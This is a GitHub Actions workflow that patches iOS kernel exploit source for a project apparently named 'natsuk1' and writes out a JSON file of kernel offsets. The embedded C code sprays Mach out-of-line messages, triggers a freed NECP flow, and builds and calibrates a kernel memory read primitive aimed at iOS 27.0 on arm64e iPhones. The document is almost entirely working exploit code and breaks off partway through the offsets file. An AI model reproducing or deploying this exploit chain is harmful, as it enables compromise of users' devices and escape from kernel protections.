name: 1 · Fix and Test

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-test-${{ github.ref }}
  cancel-in-progress: false

jobs:
  fix-and-test:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Remove competing workflow
        run: |
          rm -f .github/workflows/natsuk1.yml
          rm -f .github/workflows/main.yml

      - name: Patch necp.c
        run: |
          set -euo pipefail
          mkdir -p /tmp/nk

          cat > /tmp/nk/spray_port.c <<'CEOF'
          static int port_set_qlimit(mach_port_t p, mach_port_msgcount_t limit) {
              mach_port_limits_t limits;
              limits.mpl_qlimit = limit;
              return mach_port_set_attributes(mach_task_self(), p,
                                              MACH_PORT_LIMITS_INFO,
                                              (mach_port_info_t)&limits,
                                              MACH_PORT_LIMITS_INFO_COUNT);
          }

          static mach_port_t port_new(void) {
              mach_port_t p = MACH_PORT_NULL;
              kern_return_t kr = mach_port_allocate(mach_task_self(),
                                                    MACH_PORT_RIGHT_RECEIVE, &p);
              if (kr != KERN_SUCCESS) { log_err("PORT", "allocate kr=%d", kr); return MACH_PORT_NULL; }
              kr = mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
              if (kr != KERN_SUCCESS) { log_err("PORT", "insert_right kr=%d", kr); }
              int qr = port_set_qlimit(p, 4096);
              if (qr != KERN_SUCCESS) log_warn("PORT", "set_qlimit kr=%d", qr);
              return p;
          }
          CEOF

          cat > /tmp/nk/spray_fn.c <<'CEOF'
          static int ool_spray_count(mach_port_t port, const void *data, size_t sz, int n) {
              ool_send_t m;
              int ok = 0;
              for (int i = 0; i < n; i++) {
                  memset(&m, 0, sizeof(m));
                  m.hdr.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
                                         | MACH_MSGH_BITS_COMPLEX;
                  m.hdr.msgh_size        = sizeof(m);
                  m.hdr.msgh_remote_port = port;
                  m.hdr.msgh_id          = 0x4E41 + i;
                  m.body.msgh_descriptor_count = 1;
                  m.ool.address    = (void*)data;
                  m.ool.size       = (mach_msg_size_t)sz;
                  m.ool.copy       = MACH_MSG_VIRTUAL_COPY;
                  m.ool.deallocate = FALSE;
                  m.ool.type       = MACH_MSG_OOL_DESCRIPTOR;
                  mach_msg_return_t kr = mach_msg(&m.hdr,
                                                  MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                                  sizeof(m), 0, MACH_PORT_NULL,
                                                  100, MACH_PORT_NULL);
                  if (kr != MACH_MSG_SUCCESS) {
                      log_warn("SPRAY", "stopped at i=%d kr=%d ok=%d", i, kr, ok);
                      break;
                  }
                  ok++;
                  if ((i + 1) % 256 == 0) log_info("SPRAY", "sent %d/%d", i + 1, n);
              }
              return ok;
          }

          static void ool_spray(mach_port_t port, const void *data, size_t sz, int n) {
              (void)ool_spray_count(port, data, sz, n);
          }
          CEOF

          cat > /tmp/nk/dump.c <<'CEOF'
          static void dump_buf_words(const char *tag, const uint8_t *p, int n, int maxw) {
              char line[512];
              int off = 0;
              for (int i = 0; i < n && i < maxw; i++) {
                  uint64_t w; memcpy(&w, p + i*8, 8);
                  off += snprintf(line + off, sizeof(line) - off,
                                  "%02d:0x%016llx ", i, (unsigned long long)w);
                  if (off > 400) break;
              }
              log_info(tag, "%s", line);
          }
          CEOF

          cat > /tmp/nk/kread.c <<'CEOF'
          static int kread_raw(uint64_t target_kaddr, uint32_t read_len) {
              uint8_t fake[NCF_STRUCT_SZ];
              memset(fake, 0, sizeof(fake));
              *(uint64_t*)(fake + NCF_ASSIGNED_OFF)     = target_kaddr;
              *(uint64_t*)(fake + NCF_ASSIGNED_LEN_OFF) = read_len;
              *(uint64_t*)(fake + NCF_PARENT_OFF)       = 0;
              log_info("RAW", "read 0x%llx len=%u", (unsigned long long)target_kaddr, read_len);

              uint8_t junk[NCF_STRUCT_SZ]; memset(junk, 0x41, sizeof(junk));
              mach_port_t ex = port_new();
              if (ex == MACH_PORT_NULL) { log_err("RAW", "port_new fail"); return -1; }
              int nex = ool_spray_count(ex, junk, NCF_STRUCT_SZ, EXHAUST_N);
              log_info("RAW", "exhaust sprayed %d/%d", nex, EXHAUST_N);

              int fd = necp_open_fd();
              if (fd < 0) { log_err("RAW", "necp_open errno=%d", errno);
                            ool_drain(ex, nex);
                            mach_port_destroy(mach_task_self(), ex); return -1; }

              uint8_t cuuid[16], fuuid[16];
              int rc_ac = necp_add_client(fd, cuuid);
              int rc_af = (rc_ac == 0) ? necp_add_flow(fd, cuuid, fuuid) : -1;
              log_info("RAW", "ac=%d af=%d fd=%d", rc_ac, rc_af, fd);
              if (rc_ac != 0 || rc_af != 0) {
                  close(fd); ool_drain(ex, nex);
                  mach_port_destroy(mach_task_self(), ex); return -2;
              }

              necp_remove_flow(fd, fuuid);

              ool_drain(ex, nex);
              mach_port_destroy(mach_task_self(), ex);
              usleep(200);

              mach_port_t sp = port_new();
              if (sp == MACH_PORT_NULL) { log_err("RAW", "spray port fail"); close(fd); return -1; }
              int nsp = ool_spray_count(sp, fake, NCF_STRUCT_SZ, SPRAY_N);
              log_info("RAW", "fake sprayed %d/%d", nsp, SPRAY_N);
              usleep(150);

              memset(g_res_buf, 0, RESULT_BUF_SZ);
              int ret = necp_copy_result(fd, cuuid, g_res_buf, RESULT_BUF_SZ);
              log_info("RAW", "copy_result ret=%d", ret);
              if (ret > 0) {
                  int nw = ret / 8; if (nw > 4) nw = 4;
                  dump_buf_words("RAW", g_res_buf, nw, 4);
              }

              ool_drain(sp, nsp);
              mach_port_destroy(mach_task_self(), sp);
              close(fd);
              return ret;
          }
          CEOF

          cat > /tmp/nk/calib.c <<'CEOF'
          static int calibrate_kread(void) {
              if (g_res_off >= 0) return 0;
              const uint64_t expected = 0xFFFFFFF00ADEE310ULL;
              log_info("CAL", "anchor=kernproc@0x%llx expect=0x%llx",
                       (unsigned long long)OFF_KERNPROC,
                       (unsigned long long)expected);

              for (int attempt = 0; attempt < 12; attempt++) {
                  log_info("CAL", "----- attempt %d/12 -----", attempt);
                  int r = kread_raw(g_kbase + OFF_KERNPROC, 8);
                  log_info("CAL", "attempt %d ret=%d", attempt, r);

                  if (r <= 0) {
                      log_warn("CAL", "retry (ret<=0)");
                      usleep(400);
                      continue;
                  }

                  if (r >= 8) {
                      int nw = r / 8; if (nw > 8) nw = 8;
                      dump_buf_words("CAL", g_res_buf, nw, 8);
                  }

                  int found = 0;
                  for (int i = 0; i <= r - 8; i++) {
                      uint64_t v; memcpy(&v, g_res_buf + i, 8);
                      if (v >= KPTR_MIN && v <= KPTR_MAX) {
                          g_res_off = i;
                          log_ok("CAL", "attempt %d kptr=0x%llx at off=0x%x %s",
                                 attempt, (unsigned long long)v, i,
                                 (v == expected) ? "MATCH" : "other");
                          found = 1;
                          break;
                      }
                  }
                  if (found) return 0;

                  log_warn("CAL", "attempt %d ret=%d no kptr in buf", attempt, r);
                  usleep(400);
              }
              log_err("CAL", "gave up after 12 attempts");
              return -1;
          }
          CEOF

          cat > /tmp/nk/run.c <<'CEOF'
          static volatile int g_busy = 0;

          static int nk_necp_run_impl(void) {
              nk_log("");
              nk_log("=== natsuk1 v1.5 (natsuk1-kread-v5) ===");
              nk_log("target: iOS 27.0 / XNU / arm64e");
              nk_log("device: iPhone14,5 / iPhone14,7");
              nk_log("");
              log_info("INIT", "NCF_ASSIGNED_OFF=0x%x NCF_ASSIGNED_LEN_OFF=0x%x NCF_REFCNT_OFF=0x%x NCF_PARENT_OFF=0x%x EXHAUST_N=%d SPRAY_N=%d",
                       NCF_ASSIGNED_OFF, NCF_ASSIGNED_LEN_OFF, NCF_REFCNT_OFF, NCF_PARENT_OFF,
                       EXHAUST_N, SPRAY_N);
              log_info("P1", "slide fallback");
              g_slide = 0x3D00000ULL;
              g_kbase = KERNEL_BASE_STATIC + g_slide;
              log_ok("P1", "kbase=0x%llx", (unsigned long long)g_kbase);
              {
                  int fd = necp_open_fd();
                  if (fd < 0) { log_err("P2", "necp_open errno=%d", errno); return 1; }
                  close(fd);
                  log_ok("P2", "necp OK");
              }
              log_info("P3", "kread calibration");
              if (calibrate_kread() != 0) { log_err("P3", "failed"); return 1; }
              log_ok("P3", "kread ready (result offset=0x%x)", g_res_off);
              log_info("P4", "sanity: read anchors");
              if (sanity_check() != 0) { log_err("P4", "sanity failed"); return 1; }
              log_info("P5", "sanity: proc chain");
              if (task_sanity() != 0) { log_warn("P5", "chain broken"); }
              log_ok("DONE", "leak + slide + kread chain complete");
              nk_log("");
              nk_log("=== RESULT ===");
              nk_logx("RESULT", "kbase   = 0x%016llX", (unsigned long long)g_kbase);
              nk_logx("RESULT", "slide   = 0x%016llX", (unsigned long long)g_slide);
              nk_logx("RESULT", "kread   = 0x%016llX + 0x%llX",
                      (unsigned long long)KERNEL_BASE_STATIC,
                      (unsigned long long)OFF_KERNPROC);
              nk_log("");
              return 0;
          }

          int nk_necp_run(void) {
              if (__sync_lock_test_and_set(&g_busy, 1)) {
                  nk_log("[!] already running");
                  return 1;
              }
              int rc = nk_necp_run_impl();
              __sync_lock_release(&g_busy);
              return rc;
          }
          CEOF

          cat > /tmp/nk/patch.py <<'PYEOF'
          import re
          import sys

          p = "natsuk1/Exploit/necp.c"
          with open(p) as f:
              s = f.read()

          if "natsuk1-kread-v5" in s:
              print("already patched to v5")
              sys.exit(0)

          def rd(name):
              with open("/tmp/nk/" + name) as f:
                  return f.read().rstrip()

          spray_port = rd("spray_port.c")
          spray_fn   = rd("spray_fn.c")
          dump       = rd("dump.c")
          kread      = rd("kread.c")
          calib      = rd("calib.c")
          run        = rd("run.c")

          RE_PORT    = r"static mach_port_t port_new\(void\) \{.*?\n\}\n"
          RE_SPRAY   = r"static void ool_spray\(mach_port_t port, const void \*data, size_t sz, int n\) \{.*?\n\}\n"
          RE_KREAD   = r"static int kread_raw\(uint64_t \w+, uint32_t \w+\) \{.*?\n\}\n"
          RE_CALIB   = r"static int calibrate_kread\(void\) \{.*?\n\}\n"
          RE_COMBINED = r"static volatile int g_busy = 0;.*?int nk_necp_run\(void\) \{.*?\n\}\n"
          RE_SINGLE   = r"int nk_necp_run\(void\) \{.*?\n\}\n"

          required = [
              ("port_new", RE_PORT),
              ("ool_spray", RE_SPRAY),
              ("kread_raw", RE_KREAD),
              ("calibrate_kread", RE_CALIB),
          ]
          for name, rx in required:
              if not re.search(rx, s, flags=re.DOTALL):
                  print("ERROR: baseline pattern '%s' not found" % name)
                  sys.exit(1)

          has_combined = bool(re.search(RE_COMBINED, s, flags=re.DOTALL))
          has_single   = bool(re.search(RE_SINGLE, s, flags=re.DOTALL))
          if not (has_combined or has_single):
              print("ERROR: nk_necp_run baseline not found")
              sys.exit(1)

          orig = s

          if "static void dump_buf_words" not in s:
              m = re.search(RE_KREAD, s, flags=re.DOTALL)
              if not m:
                  print("ERROR: cannot inject dump, kread_raw anchor missing")
                  sys.exit(1)
              s = s[:m.start()] + dump + "\n\n" + s[m.start():]

          s = re.sub(RE_PORT,  spray_port + "\n\n", s, count=1, flags=re.DOTALL)
          s = re.sub(RE_SPRAY, spray_fn   + "\n\n", s, count=1, flags=re.DOTALL)
          s = re.sub(RE_KREAD, kread      + "\n\n", s, count=1, flags=re.DOTALL)
          s = re.sub(RE_CALIB, calib      + "\n\n", s, count=1, flags=re.DOTALL)

          if has_combined:
              s = re.sub(RE_COMBINED, run + "\n", s, count=1, flags=re.DOTALL)
          else:
              s = re.sub(RE_SINGLE, run + "\n", s, count=1, flags=re.DOTALL)

          if s == orig:
              print("ERROR: no changes applied")
              sys.exit(1)

          if "natsuk1-kread-v5" not in s:
              print("ERROR: marker not inserted")
              sys.exit(1)

          checks = [
              ("static volatile int g_busy = 0;", 1),
              ("static int nk_necp_run_impl(void)", 1),
              ("int nk_necp_run(void)", 1),
              ("static int port_set_qlimit(mach_port_t", 1),
              ("static mach_port_t port_new(void)", 1),
              ("static int ool_spray_count(mach_port_t", 1),
              ("static void ool_spray(mach_port_t", 1),
              ("static void ool_drain(mach_port_t", 1),
              ("static void dump_buf_words(const char", 1),
              ("static int kread_raw(uint64_t", 1),
              ("static int calibrate_kread(void)", 1),
          ]
          for pat, want in checks:
              got = s.count(pat)
              if got != want:
                  print("ERROR: '%s' count=%d want=%d" % (pat, got, want))
                  sys.exit(1)

          with open(p, "w") as f:
              f.write(s)
          print("necp.c v5 patched")
          PYEOF

          python3 /tmp/nk/patch.py

      - name: Write Offsets JSON
        run: |
          mkdir -p natsuk1/Offsets
          cat > natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json <<'JSON'
          {
            "groups": [
              { "title": "Kernel",  "items": ["off_kernel_base","off_sysent_base","off_sysent_count","off_sysent_stride","off_mach_trap_table"] },
              { "title": "Globals", "items": ["off_g_kernproc","off_g_task_list","off_g_allproc","off_g_kernel_task","off_g_zone_map","off_g_kernel_map"] },
              { "title": "Primitives", "items": ["off_fn_copyin","off_fn_copyout","off_fn_kalloc_ext","off_fn_kfree_ext"] },
              { "title": "proc", "items": ["off_proc_p_list_next","off_proc_p_pid","off_proc_p_task","off_proc_ro_p_ucred","off_proc_p_csflags"] },
              { "title": "task / thread", "items": ["off_task_map","off_task_bsd_info","off_task_itk_space","off_task_cr_label","off_thread_task_threads_next"] },
              { "title": "ucred", "items": ["off_ucred_cr_uid","off_ucred_cr_svuid","off_ucred_cr_gid","off_ucred_cr_svgid"] },
              { "title": "NECP", "items": ["off_necp_open","off_necp_client_add_flow","off_necp_client_remove_flow","off_ncf_assigned","off_ncf_assigned_len","off_ncf_parent","off_ncf_refcnt","off_ncf_struct_sz"] },
              { "title": "Zones", "items": ["off_zone_data_kalloc","off_zone_early_kalloc","off_zone_kalloc_type_var","off_zone_site_struct_task","off_zone_site_struct_proc","off_zone_site_struct_thread","off_zone_site_struct_ucred","off_zone_site_struct_ipc_port","off_zone_site_struct_ipc_entry","off_zone_site_struct_fileproc","off_zone_site_struct_fileglob","off_zone_site_struct_vnode","off_zone_site_struct_mount","off_zone_site_struct_socket","off_zone_site_struct_inpcb","off_zone_site_struct_pipe","off_zone_site_struct_vm_page"] },
              { "title": "SPTM", "items": ["off_sptm_base","off_sptm_ctrr_lock_boot","off_sptm_cpu_lock_system_registers","off_sptm_determine_kernel_ctrr","off_sptm_bootstrap","off_sptm_map","off_sptm_region","off_sptm_panic","off_sptm_page_table"] }
            ],
            "defaults": {
              "off_kernel_base": "0xFFFFFFF007004000",
              "off_sysent_base": "0x0",
              "off_sysent_count": "558",
              "off_sysent_stride": "24",
